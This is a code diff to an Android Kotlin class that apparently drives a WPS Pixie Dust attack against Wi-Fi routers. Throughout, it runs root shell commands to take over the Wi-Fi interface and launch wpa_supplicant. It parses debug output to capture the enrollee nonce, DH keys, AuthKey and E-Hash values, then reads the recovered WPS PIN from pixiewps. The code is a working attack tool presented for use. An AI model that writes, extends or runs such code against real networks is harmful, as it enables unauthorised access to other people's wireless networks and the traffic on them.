@@ -35,6 +35,8 @@ class PixieDustHelper(
     private var pixieDataProgress = 0
     private val totalPixieDataFields = 6
 
+    private var useAggressiveCleanup = false
+
     interface PixieDustCallbacks {
         fun onStateChanged(state: PixieAttackState)
         fun onProgressUpdate(message: String)
@@ -114,6 +116,10 @@ class PixieDustHelper(
         }
     }
 
+    fun setAggressiveCleanup(enabled: Boolean) {
+        useAggressiveCleanup = enabled
+    }
+
     private fun createLibrarySymlinks() {
         val arch = if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) "" else "-32"
         val symlinkCommands = listOf(
@@ -142,6 +148,12 @@ class PixieDustHelper(
     }
 
     fun startPixieAttack(network: WpsNetwork, wpsTimeout: Long = 40000L, extractionTimeout: Long = 30000L, computationTimeout: Long = 300000L) {
+        pixieData.clear()
+        pixieDataProgress = 0
+        wpsProcessStarted = false
+        notVulnerableWarningShown = false
+        currentBssid = ""
+        currentEssid = ""
         if (attackJob?.isActive == true) {
             Log.w(TAG, "Attack already in progress")
             return
@@ -251,9 +263,11 @@ class PixieDustHelper(
                 cleanupIsolatedFiles()
                 delay(1000)
 
-                callbacks.onLogEntry(LogEntry("Restoring system WiFi services...", LogColorType.INFO))
-                restoreSystemWifiServices()
-                delay(3000)
+                if (useAggressiveCleanup) {
+                    callbacks.onLogEntry(LogEntry("Restoring system WiFi services...", LogColorType.INFO))
+                    restoreSystemWifiServices()
+                    delay(3000)
+                }
 
                 callbacks.onLogEntry(LogEntry("Restoring WiFi state...", LogColorType.INFO))
                 restoreWifiState()
@@ -271,6 +285,11 @@ class PixieDustHelper(
     private suspend fun restoreSystemWifiServices() {
         withContext(Dispatchers.IO) {
             try {
+                if (!useAggressiveCleanup) {
+                    callbacks.onLogEntry(LogEntry("Skipping system services restore (simple mode)", LogColorType.INFO))
+                    return@withContext
+                }
+
                 callbacks.onLogEntry(LogEntry("Safely starting system WiFi services...", LogColorType.INFO))
 
                 val restoreSettings = listOf(
@@ -412,6 +431,59 @@ class PixieDustHelper(
     private suspend fun restoreWifiState() {
         withContext(Dispatchers.IO) {
             try {
+                if (useAggressiveCleanup) {
+                    restoreWifiStateAggressive()
+                } else {
+                    restoreWifiStateSimple()
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error restoring WiFi state", e)
+                callbacks.onLogEntry(LogEntry("WiFi restore error: ${e.message}", LogColorType.ERROR))
+            }
+        }
+    }
+
+    private suspend fun restoreWifiStateSimple() {
+        withContext(Dispatchers.IO) {
+            try {
+                callbacks.onLogEntry(LogEntry("Enabling WiFi...", LogColorType.INFO))
+
+                try {
+                    wifiManager.isWifiEnabled = true
+                    delay(5000)
+                    callbacks.onLogEntry(LogEntry("WiFi enabled", LogColorType.SUCCESS))
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to enable WiFi via WifiManager, trying alternative", e)
+
+                    val enableCommands = listOf(
+                        "echo 0 > /sys/class/net/wlan0/device/rf_kill",
+                        "svc wifi enable",
+                        "ifconfig wlan0 up",
+                        "ip link set wlan0 up"
+                    )
+
+                    enableCommands.forEach { command ->
+                        try {
+                            Shell.cmd(command).exec()
+                            delay(1000)
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Enable command failed: $command", e)
+                        }
+                    }
+
+                    callbacks.onLogEntry(LogEntry("WiFi enabled via root commands", LogColorType.SUCCESS))
+                }
+
+            } catch (e: Exception) {
+                Log.w(TAG, "Error in simple WiFi enable", e)
+                callbacks.onLogEntry(LogEntry("Error enabling WiFi: ${e.message}", LogColorType.ERROR))
+            }
+        }
+    }
+
+    private suspend fun restoreWifiStateAggressive() {
+        withContext(Dispatchers.IO) {
+            try {
                 callbacks.onLogEntry(LogEntry("Performing full WiFi reset...", LogColorType.INFO))
 
                 val wifiResetCommands = listOf(
@@ -433,7 +505,8 @@ class PixieDustHelper(
                 val moduleCommands = listOf(
                     "rmmod wlan",
                     "sleep 2",
-                    "modprobe wlan"
+                    "modprobe wlan",
+                    "svc wifi enable"
                 )
 
                 moduleCommands.forEach { command ->
@@ -523,8 +596,6 @@ class PixieDustHelper(
                 ./wpa_supplicant$arch -dd -K -Dnl80211,wext,hostapd,wired -i wlan0 -c$isolatedConfigPath -O$socketDir -P$isolatedConfigDir/wpa_supplicant.pid
             """.trimIndent()
 
-                callbacks.onLogEntry(LogEntry("Starting wpa_supplicant with config: $isolatedConfigPath", LogColorType.INFO))
-
                 supplicantProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
                 supplicantOutput = BufferedReader(InputStreamReader(supplicantProcess!!.inputStream))
 
@@ -577,7 +648,7 @@ class PixieDustHelper(
                 val createCommands = listOf(
                     "mkdir -p $configDir",
                     "chmod 755 $configDir",
-                    "cat > $configPath << 'EOF'\nctrl_interface_group=wifi\nupdate_config=0\nap_scan=1\neapol_version=1\nfast_reauth=1\nEOF",
+                    "cat > $configPath << 'EOF'\nctrl_interface_group=wifi\nupdate_config=0",
                     "chmod 644 $configPath"
                 )
 
@@ -631,7 +702,6 @@ update_config=0
 
                     val verifyResult = Shell.cmd("test -f $configPath && echo 'OK' || echo 'FAIL'").exec()
                     if (verifyResult.isSuccess && verifyResult.out.contains("OK")) {
-                        callbacks.onLogEntry(LogEntry("Created isolated config at: $configPath", LogColorType.SUCCESS))
                     } else {
                         throw Exception("Config file verification failed")
                     }
@@ -649,105 +719,262 @@ update_config=0
         }
     }
 
+    private var currentBssid: String = ""
+    private var currentEssid: String = ""
+    private var wpsProcessStarted = false
+    private var notVulnerableWarningShown = false
+
     private fun parseLine(line: String) {
         Log.d("WPA-SUP", line)
 
         when {
-            line.contains("WPS: M1 received") || line.contains("WPS: Building Message M1") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M1 Message", LogColorType.INFO))
+            line.contains("No suitable network found") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_waiting_target), LogColorType.NORMAL))
             }
-            line.contains("WPS: M2 received") || line.contains("WPS: Building Message M2") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M2 Message", LogColorType.INFO))
+
+            line.contains("nl80211: Connect request send successfully") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_auth_request), LogColorType.SUCCESS))
             }
-            line.contains("WPS: M3 received") || line.contains("WPS: Building Message M3") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M3 Message", LogColorType.INFO))
+
+            line.contains("Request association with") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_assoc_request), LogColorType.SUCCESS))
             }
-            line.contains("WPS: M4 received") || line.contains("WPS: Building Message M4") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M4 Message", LogColorType.INFO))
+
+            line.contains("Association info event") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_connected_to_ap), LogColorType.SUCCESS))
             }
-            line.contains("WPS: M5 received") || line.contains("WPS: Building Message M5") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M5 Message", LogColorType.INFO))
+
+            line.contains("Associated with") && line.contains("nl80211:") -> {
+                val bssidMatch = "Associated with ([0-9a-fA-F:]{17})".toRegex().find(line)
+                bssidMatch?.let {
+                    currentBssid = it.groupValues[1]
+                    if (currentEssid.isNotEmpty()) {
+                        callbacks.onLogEntry(LogEntry(
+                            context.getString(R.string.pixie_log_associated, currentBssid, currentEssid),
+                            LogColorType.SUCCESS
+                        ))
+                    }
+                }
             }
-            line.contains("WPS: M6 received") || line.contains("WPS: Building Message M6") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M6 Message", LogColorType.INFO))
+
+            line.contains("Set drv->ssid based on scan res info to") -> {
+                val essidMatch = "Set drv->ssid based on scan res info to '([^']*)'".toRegex().find(line)
+                essidMatch?.let {
+                    currentEssid = it.groupValues[1]
+                    if (currentBssid.isNotEmpty()) {
+                        callbacks.onLogEntry(LogEntry(
+                            context.getString(R.string.pixie_log_associated, currentBssid, currentEssid),
+                            LogColorType.SUCCESS
+                        ))
+                    }
+                }
             }
-            line.contains("WPS: M7 received") || line.contains("WPS: Building Message M7") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M7 Message", LogColorType.INFO))
+
+            line.contains("EAPOL: txStart") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_eapol_start), LogColorType.SUCCESS))
             }
-            line.contains("WPS: M8 received") || line.contains("WPS: Building Message M8") -> {
-                callbacks.onLogEntry(LogEntry(">>> WPS M8 Message", LogColorType.INFO))
+
+            line.contains("EAP-Request Identity") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_identity_response), LogColorType.SUCCESS))
             }
+
+            line.contains("EAP-Request id=") && line.contains("method=1") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_identity_request), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received M1") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m1_received), LogColorType.SUCCESS))
+                wpsProcessStarted = true
+            }
+
+            line.contains("WPS: Building Message M2") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m2_sending), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received M3") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m3_received), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Building Message M4") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m4_sending), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received M5") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m5_received), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Building Message M6") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m6_sending), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received M7") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m7_received), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received M8") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_m8_received), LogColorType.SUCCESS))
+            }
+
+            line.contains("WPS: Received WSC_NACK") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wsc_nack_received), LogColorType.ERROR))
+
+                val configErrorMatch = "Configuration Error (\\d+)".toRegex().find(line)
+                configErrorMatch?.let {
+                    val errorCode = it.groupValues[1].toInt()
+                    val errorDescription = getWpsConfigErrorDescription(errorCode)
+                    callbacks.onLogEntry(LogEntry(
+                        context.getString(R.string.pixie_log_deauth_reason, errorDescription),
+                        LogColorType.ERROR
+                    ))
+                }
+            }
+
+            line.contains("WPS: Enrollee terminated negotiation with Configuration Error") -> {
+                val errorMatch = "Configuration Error (\\d+)".toRegex().find(line)
+                errorMatch?.let {
+                    val errorCode = it.groupValues[1].toInt()
+                    val errorDescription = getWpsConfigErrorDescription(errorCode)
+                    callbacks.onLogEntry(LogEntry(
+                        context.getString(R.string.pixie_log_deauth_reason, errorDescription),
+                        LogColorType.ERROR
+                    ))
+                }
+            }
+
+            line.contains("WPS: Building Message WSC_NACK") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wsc_nack_sending), LogColorType.SUCCESS))
+            }
+
+            line.contains("EAPOL: enable timer tick") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wps_cycle_started), LogColorType.HIGHLIGHT))
+            }
+
+            line.contains("EAPOL: disable timer tick") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_wps_cycle_ended), LogColorType.NORMAL))
+            }
+
+            line.contains("Event DEAUTH") || line.contains("Event DISCONNECT") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_connection_lost), LogColorType.ERROR))
+            }
+
+            line.contains("Enrollee Nonce") && line.contains("hexdump(len=16):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null) {
+                    pixieData["enrolleeNonce"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_enrollee_nonce), LogColorType.SUCCESS))
+                }
+            }
+
+            line.contains("DH own Public Key") && line.contains("hexdump(len=192):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null) {
+                    pixieData["ownPublicKey"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_own_public_key), LogColorType.SUCCESS))
+                }
+            }
+
+            line.contains("DH peer Public Key") && line.contains("hexdump(len=192):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null) {
+                    pixieData["peerPublicKey"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_peer_public_key), LogColorType.SUCCESS))
+                }
+            }
+
+            line.contains("AuthKey") && line.contains("hexdump(len=32):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null && !hex.contains("[REMOVED]")) {
+                    pixieData["authenticationKey"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_authkey), LogColorType.SUCCESS))
+                }
+            }
+
+            line.contains("E-Hash1") && line.contains("hexdump(len=32):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null) {
+                    pixieData["hashOne"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_e_hash1), LogColorType.SUCCESS))
+                }
+            }
+
+            line.contains("E-Hash2") && line.contains("hexdump(len=32):") -> {
+                val hex = extractHexDataClean(line)
+                if (hex != null) {
+                    pixieData["hashTwo"] = hex
+                    pixieDataProgress++
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_e_hash2), LogColorType.SUCCESS))
+
+                    if (pixieDataProgress == totalPixieDataFields) {
+                        callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_all_data_collected), LogColorType.HIGHLIGHT))
+                    }
+                }
+            }
+
+            line.contains("PSK1") && line.contains("hexdump(len=16):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_psk1), LogColorType.SUCCESS))
+            }
+
+            line.contains("PSK2") && line.contains("hexdump(len=16):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_psk2), LogColorType.SUCCESS))
+            }
+
+            line.contains("R-S1") && line.contains("hexdump(len=16):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_s1), LogColorType.SUCCESS))
+            }
+
+            line.contains("R-S2") && line.contains("hexdump(len=16):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_s2), LogColorType.SUCCESS))
+            }
+
+            line.contains("R-Hash1") && line.contains("hexdump(len=32):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_hash1), LogColorType.SUCCESS))
+            }
+
+            line.contains("R-Hash2") && line.contains("hexdump(len=32):") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_r_hash2), LogColorType.SUCCESS))
+            }
+
             line.contains("CTRL-EVENT-ASSOC-REJECT") -> {
                 val statusCode = extractStatusCode(line)
                 val bssid = extractBssid(line)
                 val message = getAssocRejectMessage(statusCode)
                 callbacks.onLogEntry(LogEntry("⚠ $message (BSSID: $bssid)", LogColorType.ERROR))
             }
-            line.contains("EAPOL: enable timer tick") -> {
-                callbacks.onLogEntry(LogEntry("--- New WPS cycle started ---", LogColorType.HIGHLIGHT))
-            }
-            line.contains("EAPOL: disable timer tick") -> {
-                callbacks.onLogEntry(LogEntry("--- WPS cycle ended ---", LogColorType.NORMAL))
-            }
-            line.contains("Event DEAUTH") || line.contains("Event DISCONNECT") -> {
-                callbacks.onLogEntry(LogEntry("Connection lost, retrying...", LogColorType.ERROR))
-            }
-            line.contains("Association info event") -> {
-                callbacks.onLogEntry(LogEntry("Connected to AP", LogColorType.SUCCESS))
-            }
-            // Существующие обработчики для WPS данных...
-            line.contains("Enrollee Nonce") && line.contains("hexdump(len=16):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null) {
-                    pixieData["enrolleeNonce"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ Enrollee Nonce ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
-                }
-            }
-            line.contains("DH own Public Key") && line.contains("hexdump(len=192):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null) {
-                    pixieData["ownPublicKey"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ Own Public Key ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
-                }
-            }
-            line.contains("DH peer Public Key") && line.contains("hexdump(len=192):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null) {
-                    pixieData["peerPublicKey"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ Peer Public Key ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
-                }
-            }
-            line.contains("AuthKey") && line.contains("hexdump(len=32):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null && !hex.contains("[REMOVED]")) {
-                    pixieData["authenticationKey"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ AuthKey ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
-                }
-            }
-            line.contains("E-Hash1") && line.contains("hexdump(len=32):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null) {
-                    pixieData["hashOne"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ E-Hash1 ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
-                }
-            }
-            line.contains("E-Hash2") && line.contains("hexdump(len=32):") -> {
-                val hex = extractHexDataClean(line)
-                if (hex != null) {
-                    pixieData["hashTwo"] = hex
-                    pixieDataProgress++
-                    callbacks.onLogEntry(LogEntry("✓ E-Hash2 ($pixieDataProgress/$totalPixieDataFields)", LogColorType.SUCCESS))
+        }
 
-                    if (pixieDataProgress == totalPixieDataFields) {
-                        callbacks.onLogEntry(LogEntry("🎯 ALL DATA COLLECTED: [${pixieData.keys.joinToString(", ")}]", LogColorType.HIGHLIGHT))
-                    }
-                }
-            }
+        if (wpsProcessStarted && pixieDataProgress == 4 && !notVulnerableWarningShown) {
+            notVulnerableWarningShown = true
+            callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_possibly_not_vulnerable), LogColorType.ERROR))
+        }
+    }
+
+    private fun getWpsConfigErrorDescription(errorCode: Int): String {
+        return when (errorCode) {
+            0 -> context.getString(R.string.wps_config_error_0)
+            1 -> context.getString(R.string.wps_config_error_1)
+            2 -> context.getString(R.string.wps_config_error_2)
+            3 -> context.getString(R.string.wps_config_error_3)
+            4 -> context.getString(R.string.wps_config_error_4)
+            5 -> context.getString(R.string.wps_config_error_5)
+            6 -> context.getString(R.string.wps_config_error_6)
+            7 -> context.getString(R.string.wps_config_error_7)
+            8 -> context.getString(R.string.wps_config_error_8)
+            9 -> context.getString(R.string.wps_config_error_9)
+            10 -> context.getString(R.string.wps_config_error_10)
+            11 -> context.getString(R.string.wps_config_error_11)
+            12 -> context.getString(R.string.wps_config_error_12)
+            13 -> context.getString(R.string.wps_config_error_13)
+            14 -> context.getString(R.string.wps_config_error_14)
+            15 -> context.getString(R.string.wps_config_error_15)
+            16 -> context.getString(R.string.wps_config_error_16)
+            17 -> context.getString(R.string.wps_config_error_17)
+            18 -> context.getString(R.string.wps_config_error_18)
+            else -> context.getString(R.string.wps_config_error_default, errorCode)
         }
     }
 
@@ -884,6 +1111,57 @@ update_config=0
     private suspend fun stopExistingProcesses() {
         withContext(Dispatchers.IO) {
             try {
+                if (useAggressiveCleanup) {
+                    stopExistingProcessesAggressive()
+                } else {
+                    stopExistingProcessesSimple()
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error stopping processes", e)
+                callbacks.onLogEntry(LogEntry("Error stopping processes: ${e.message}", LogColorType.ERROR))
+            }
+        }
+    }
+
+    private suspend fun stopExistingProcessesSimple() {
+        withContext(Dispatchers.IO) {
+            try {
+                Log.d(TAG, "Using simple WiFi disable")
+                callbacks.onLogEntry(LogEntry("Disabling WiFi...", LogColorType.INFO))
+
+                try {
+                    wifiManager.isWifiEnabled = false
+                    delay(3000)
+                    callbacks.onLogEntry(LogEntry("WiFi disabled", LogColorType.SUCCESS))
+                } catch (e: Exception) {
+                    Log.w(TAG, "Failed to disable WiFi via WifiManager, trying alternative", e)
+
+                    val disableCommands = listOf(
+                        "svc wifi disable"
+                    )
+
+                    disableCommands.forEach { command ->
+                        try {
+                            Shell.cmd(command).exec()
+                            delay(500)
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Disable command failed: $command", e)
+                        }
+                    }
+
+                    callbacks.onLogEntry(LogEntry("WiFi disabled via root commands", LogColorType.SUCCESS))
+                }
+
+            } catch (e: Exception) {
+                Log.w(TAG, "Error in simple WiFi disable", e)
+                callbacks.onLogEntry(LogEntry("Error disabling WiFi: ${e.message}", LogColorType.ERROR))
+            }
+        }
+    }
+
+    private suspend fun stopExistingProcessesAggressive() {
+        withContext(Dispatchers.IO) {
+            try {
                 Log.d(TAG, "Safely stopping system WiFi services")
                 callbacks.onLogEntry(LogEntry("Safely stopping system WiFi services...", LogColorType.INFO))
 
@@ -902,6 +1180,7 @@ update_config=0
 
                 callbacks.onLogEntry(LogEntry("Stopping system WiFi services...", LogColorType.INFO))
                 val stopServices = listOf(
+                    "svc wifi disable",
                     "stop wifihal",
                     "stop wifi",
                     "stop wpa_supplicant",
@@ -944,12 +1223,10 @@ update_config=0
 
                 callbacks.onLogEntry(LogEntry("Preparing isolated WiFi interface...", LogColorType.INFO))
                 val interfaceCommands = listOf(
+                    "svc wifi disable",
                     "ifconfig wlan0 down",
                     "ip link set wlan0 down",
-                    "iw dev wlan0 disconnect",
-                    "sleep 2",
-                    "ifconfig wlan0 up",
-                    "ip link set wlan0 up"
+                    "iw dev wlan0 disconnect"
                 )
 
                 interfaceCommands.forEach { command ->
@@ -1007,7 +1284,6 @@ update_config=0
                     }
                 }
 
-                // Проверяем, не была ли атака отменена
                 if (attackJob?.isCancelled == true) {
                     Log.d(TAG, "Attack was cancelled during data extraction")
                     return@withContext null
@@ -1133,7 +1409,11 @@ update_config=0
     @SuppressLint("LongLogTag")
     private fun parsePixieDustLine(line: String) {
         Log.d("PIXIEDUST", "Output: $line")
+
         when {
+            line.contains("Pixiewps") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_starting_pixiewps), LogColorType.SUCCESS))
+            }
             line.contains("WPS pin", ignoreCase = true) -> {
                 val parts = line.split(":")
                 if (parts.size >= 2) {
@@ -1142,8 +1422,15 @@ update_config=0
                     pixieData["wpsPin"] = pin
                 }
             }
-            line.contains("not found", ignoreCase = true) -> {
-                Log.w(TAG, "pixiedust: PIN not found: $line")
+            line.contains("WPS pin not found", ignoreCase = true) || line.contains("[-] WPS pin not found") -> {
+                callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_pin_not_found), LogColorType.ERROR))
+            }
+            line.contains("Time taken:") -> {
+                val timeMatch = "Time taken: (.+)".toRegex().find(line)
+                timeMatch?.let {
+                    val timeStr = it.groupValues[1]
+                    callbacks.onLogEntry(LogEntry(context.getString(R.string.pixie_log_time_taken, timeStr), LogColorType.INFO))
+                }
             }
             line.contains("error", ignoreCase = true) -> {
                 Log.w(TAG, "pixiedust: Error: $line")
